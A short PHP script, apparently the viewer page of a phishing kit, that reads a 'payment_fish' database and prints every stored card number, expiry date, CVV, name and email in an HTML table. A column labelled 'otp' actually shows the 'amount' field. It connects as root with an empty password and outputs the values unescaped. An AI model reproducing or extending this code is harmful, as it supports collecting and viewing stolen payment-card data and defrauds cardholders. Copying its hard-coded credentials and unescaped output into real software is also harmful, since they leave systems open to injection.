<?php
$servername = "localhost";
$username = "root";
$password = "";
$database = "payment_fish";

$conn = mysqli_connect($servername, $username, $password, $database);

if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

$query = "SELECT * FROM payment";
$result = mysqli_query($conn, $query);

$data = array();
if (mysqli_num_rows($result) > 0) {
    while ($row = mysqli_fetch_assoc($result)) {
        $data[] = $row;
    }
}

mysqli_close($conn);

$output = '<tr>
                <th>cardNo</th>
                <th>expiry_date</th>
                <th>cvv</th>
                <th>name</th>
                <th>Email</th>
                <th>otp</th>
                
            </tr>';

foreach ($data as $row) {
    $output .= '<tr>
                    <td>' . $row["card_number"] . '</td>
                    <td>' . $row["expiry_date"] . '</td>
                    <td>' . $row["cvv"] . '</td>
                    <td>' . $row["name"] . '</td>
                    <td>' . $row["email"] . '</td>
                    <td>' . $row["amount"] . '</td>
                    
                </tr>';
}

echo $output;
?>